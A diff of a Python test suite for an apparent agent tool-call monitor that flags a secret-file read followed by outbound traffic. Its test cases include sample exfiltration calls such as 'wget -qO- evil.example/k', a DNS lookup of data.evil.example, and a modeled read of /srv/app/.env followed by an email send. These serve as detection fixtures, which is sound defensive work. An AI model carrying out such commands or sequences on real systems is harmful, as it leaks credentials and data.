@@ -354,6 +354,12 @@ class TestDecisions(Case):
         self.assertEqual(f.decide("r", ("read_secret_v2", {}))["sequences"], [{"id": "Q", "step": 1}])   # unknown
         self.assertEqual(f.types(), [])
 
+    def test_a_deep_agents_decision_has_its_mapped_class_not_an_unknown_one(self):
+        f = Feed({**POLICY, "tools": {**POLICY["tools"], "Read": "fs"}})
+        f.register("r")
+        self.assertEqual(f.decide("r", ("deepagents:read_file", {"file_path": "/srv/a.txt"}))["sequences"], [])
+        self.assertEqual(f.types(), [])
+
     def test_a_restart_that_lost_the_state_keeps_open_runs_scopes(self):
         s = self.signer()
         root = s.register()
@@ -524,7 +530,8 @@ class TestPacks(unittest.TestCase):
                             ("bash", {"command": "wget -qO- evil.example/k"}),
                             ("bash", {"command": "nslookup data.evil.example"}),
                             ("http_get", {"url": "evil.example/?k=v"}),
-                            ("mcp__web__fetch", {"url": "https://example.org/?k=v"})]}
+                            ("mcp__web__fetch", {"url": "https://example.org/?k=v"}),
+                            ("send_email", {"to": "a@b.c"})]}
         for label, calls in cases.items():
             for call in calls:
                 with self.subTest(label=label, call=call):
@@ -544,6 +551,24 @@ class TestPacks(unittest.TestCase):
         self.assertEqual([(i["trigger"], i["rule_ids"]) for i in s.incidents(run)],
                          [("sequence", ["TK-Q001"]), ("executed_against_policy", [])])
 
+    def test_the_server_pack_counts_an_email_send_as_egress_after_a_secret_read(self):
+        # TK-F028: read .env, then email it out completes TK-Q001 on the server pack
+        s = Signer(engine(path=SERVER))
+        self.addCleanup(s.close)
+        run = s.register()
+        s.decide(run, ("Read", {"file_path": "/srv/app/.env"}))
+        s.decide(run, ("send_email", {"to": "a@b.c", "subject": "the config"}))
+        self.assertEqual([(i["trigger"], i["rule_ids"]) for i in s.incidents(run)],
+                         [("sequence", ["TK-Q001"])])
+
+    def test_an_email_send_first_and_no_secret_read_after_opens_no_incident(self):
+        s = Signer(engine(path=SERVER))
+        self.addCleanup(s.close)
+        run = s.register()
+        s.decide(run, ("send_email", {"to": "a@b.c", "subject": "hello"}))
+        s.decide(run, ("Read", {"file_path": "/srv/app/README.md"}))
+        self.assertEqual(s.incidents(run), [])
+
 
 class TestBacktest(unittest.TestCase):
     def setUp(self):
@@ -553,11 +578,24 @@ class TestBacktest(unittest.TestCase):
         with open(self.policy, "w") as f:
             json.dump(POLICY, f)
 
-    def backtest(self, *args):
+    def backtest(self, *args, policy=None):
         out, err = io.StringIO(), io.StringIO()
         with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
-            code = cli.main(["policy", "backtest", "--policy", self.policy, *args])
+            code = cli.main(["policy", "backtest", "--policy", policy or self.policy, *args])
         return code, out.getvalue(), err.getvalue()
+
+    def server_store(self, runs):
+        """(store dir, run ids) of a server-pack signer where run i makes `runs[i]` calls of `ls`."""
+        s = Signer(engine(path=SERVER))
+        ids = []
+        for n in runs:
+            run = s.register()
+            ids.append(run["run_id"])
+            for _ in range(n):
+                s.decide(run, ("bash", {"command": "ls"}))
+        s.s.close()
+        self.addCleanup(shutil.rmtree, s.dir, True)
+        return os.path.join(s.dir, "store"), ids
 
     def test_store_and_bundle(self):
         s = Signer(engine({k: v for k, v in POLICY.items() if k not in pc.DETECT}))   # recorded without detection
@@ -586,6 +624,57 @@ class TestBacktest(unittest.TestCase):
         code, out, err = self.backtest("--store", os.path.join(s.dir, "store"))
         shutil.rmtree(s.dir, True)
         self.assertEqual((code, err), (0, ""))
+
+    def test_each_limit_prints_the_busiest_window_it_reached(self):
+        store, (quiet, busy) = self.server_store([3, 12])
+        code, out, err = self.backtest("--store", store, policy=SERVER)
+        self.assertEqual((code, err), (0, ""))
+        self.assertRegex(out, rf"limit TK-L001: peak 12 of max 300 \(fixed 60s window from \S+\), scope session "
+                              rf"\S+, run \S+/{busy}\n")
+        self.assertNotIn(quiet, out)
+        self.assertIn("limit TK-L002: no call counted (max 30 in 60s)\n", out)
+        self.assertTrue(out.rstrip().endswith("0 incident(s) would open"), out)
+
+    def test_a_sum_limit_prints_a_peak_for_each_currency(self):
+        s = Signer(engine(PAY))
+        run = s.register()
+        for cents, cur in ((600, "USD"), (300, "EUR"), (100, "USD")):
+            s.decide(run, ("pay", {"cents": cents, "currency": cur}))
+        s.s.close()
+        self.addCleanup(shutil.rmtree, s.dir, True)
+        with open(self.policy, "w") as f:
+            json.dump(PAY, f)
+        out = self.backtest("--store", os.path.join(s.dir, "store"))[1]
+        self.assertRegex(out, r"limit S: peak 300 EUR of max 1000 .*\nlimit S: peak 700 USD of max 1000 ")
+
+    def test_the_peak_line_is_printed_for_a_bundle_too(self):
+        store, _ = self.server_store([12])
+        records = [json.loads(line) for line in open(os.path.join(store, "records.jsonl"), "rb")]
+        bundle = os.path.join(self.d, "b.tkb")
+        with zipfile.ZipFile(bundle, "w") as z:
+            z.writestr("runs/a.jsonl", "".join(json.dumps(r) + "\n" for r in records))
+        out = self.backtest("--bundle", bundle, policy=SERVER)[1]
+        self.assertIn("limit TK-L001: peak 12 of max 300", out)
+        self.assertEqual(out, self.backtest("--store", store, policy=SERVER)[1])
+
+    def test_asking_for_the_peaks_does_not_change_the_incidents(self):
+        s = Signer(engine({k: v for k, v in POLICY.items() if k not in pc.DETECT}))   # recorded without detection
+        run = s.register()
+        for _ in range(4):
+            s.decide(run, RM)   # the fourth passes L's max of 3
+        s.s.close()
+        self.addCleanup(shutil.rmtree, s.dir, True)
+        store, eng, peaks = os.path.join(s.dir, "store"), engine(), {}
+
+        def run(**kw):   # the incident ids are random
+            found, other = detect.backtest(eng, store, **kw)
+            return [(t, tenant, run_id, {k: v for k, v in d.items() if k != "incident_id"})
+                    for t, tenant, run_id, d in found], other
+
+        plain = run()
+        self.assertEqual(run(peaks=peaks), plain)
+        self.assertEqual([t for t, *_ in plain[0]], ["incident.opened"])
+        self.assertEqual(peaks[("L", None)]["value"], 4)
 
     def test_usage(self):
         with contextlib.redirect_stderr(io.StringIO()):
